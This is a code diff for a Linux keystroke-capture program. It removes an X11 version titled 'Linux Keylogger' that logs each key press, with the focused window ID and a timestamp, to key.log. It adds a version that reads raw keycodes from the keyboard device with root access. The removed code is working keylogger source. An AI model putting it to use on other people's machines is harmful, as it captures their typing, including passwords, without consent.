@@ -1,108 +1,64 @@
-// Logs Linux Keys
-
-// Run with flag -lX11
-//
-//This only really works for letters and numbers, the goal would be
-//the equivalent to the command 'sudo evtest /dev/input/by-path/platform-i8042-serio-0-event-kbd'
-// This command shows all presses and releases of every single keyboard button, read directly from the device
-
-
-
-//These should be standard libraries for LINUX
-#include <X11/Xlib.h>
-#include <stdio.h>
-#include <stdarg.h>
-#include <time.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <linux/input.h>
 #include <string.h>
+#include <stdio.h>
+#include <iostream>
+//UPDATED: Now gives an integer for every keyboard input.
+//It requires root access though because 
+//it needs to read directly from the device "/dev/input/by-path/platform-i8042-serio-0-event-kbd"
+//This is the universal linux keyboard device 
 
-void Keyboard (const char * fmt, ...)
+//This code is here for possible use in the future, but not necessary
+static const char *const evval[3] = {
+    "RELEASED",
+    "PRESSED ",
+    "REPEATED"
+};
+
+int Keyboard()
 {
-	va_list		va_alist;
-	char		buf[256],logbuf[256];
-	FILE*		file;
-	struct tm*	current_tm;
-	time_t	current_time;
-	time ( &current_time );
-	
-	current_tm = localtime ( &current_time );
-	
-	sprintf ( logbuf, "%02d:%02d:%02d-> ", current_tm->tm_hour, current_tm->tm_min, current_tm->tm_sec );
-	va_start( va_alist, fmt );
-	vsprintf( buf, fmt, va_alist );
-	va_end( va_alist );
-	strcat( logbuf, buf );
-	strcat( logbuf, "\n");
+    const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
+    struct input_event ev;
+    ssize_t n;
+    int fd;
 
-	if( ( file = fopen( "key.log", "a+") ) != NULL )
-	{
-		fputs( logbuf, file );
-		fclose( file );
-	}
+    fd = open(dev, O_RDONLY);
+    if (fd == -1) {
+        fprintf(stderr, "Cannot open %s: %s.\n", dev, strerror(errno));
+        return 0;
+    }
+    while (1) {
+        n = read(fd, &ev, sizeof ev);
+        if (n == (ssize_t)-1) {
+            if (errno == EINTR)
+                continue;
+            else
+                break;
+        } else
+        if (n != sizeof ev) {
+            errno = EIO;
+            break;
+        }
+        if (ev.type == EV_KEY && ev.value >= 0 && ev.value <= 2){
+	//For some odd reason, the program breaks without "std::cout<<"";", may fix later
+	std::cout<<"";
+	int KeyCode = (int)ev.code;           
+	return KeyCode;
 }
 
-int main( int argc, char* argv[] )
-{
-    Display * display;
-
-    char szKey[32];
-    char szKeyOld[32] = {0};
-
-    char szBit;
-    char szBitOld;
-    int  iCheck;
-
-    char szKeysym;
-    char * szKeyString;
-
-    int iKeyCode;
-
-    Window focusWin = NULL;
-    int iReverToReturn = NULL;
-
-    printf( "%s\n%s\n\n",
-    "Linux Keylogger",
-    "Version: 1");
-
-    display = XOpenDisplay( NULL );
-
-    if( display == NULL )
-    {
-        printf( "Error: XOpenDisplay" );
-        return -1;
     }
-
-    while( true )
-    {
-        XQueryKeymap( display, szKey );
-
-        if( memcmp( szKey, szKeyOld, 32 ) != NULL )
-        {
-            for( int i = 0; i < sizeof( szKey ); i++ )
-            {
-                szBit = szKey[i];
-                szBitOld = szKeyOld[i];
-                iCheck = 1;
-
-                for ( int j = 0 ; j < 8 ; j++ )
-                {
-                     if ( ( szBit & iCheck ) && !( szBitOld & iCheck ) )
-                     {
-                         iKeyCode = i * 8 + j ;
-
-                         szKeysym = XKeycodeToKeysym( display, iKeyCode, 0 );
-                         szKeyString = XKeysymToString( szKeysym );
-
-                         XGetInputFocus( display, &focusWin, &iReverToReturn );
-                         printf( "WindowID %x Key: %s\n", focusWin, szKeyString );
-
-                         Keyboard( "WindowID %x Key: %s\n", focusWin, szKeyString );
-                     }
-                    iCheck = iCheck << 1 ;
-                }
-            }
-        }
-        memcpy( szKeyOld, szKey, 32 );
-    }
-    XCloseDisplay( display );
+    fflush(stdout);
+    fprintf(stderr, "%s.\n", strerror(errno));
     return 0;
+}
+
+int main(){
+	while (true){
+		int KeyCode=Keyboard();
+		std::cout<<std::endl<<KeyCode;
+	}
+	return 0;
 }
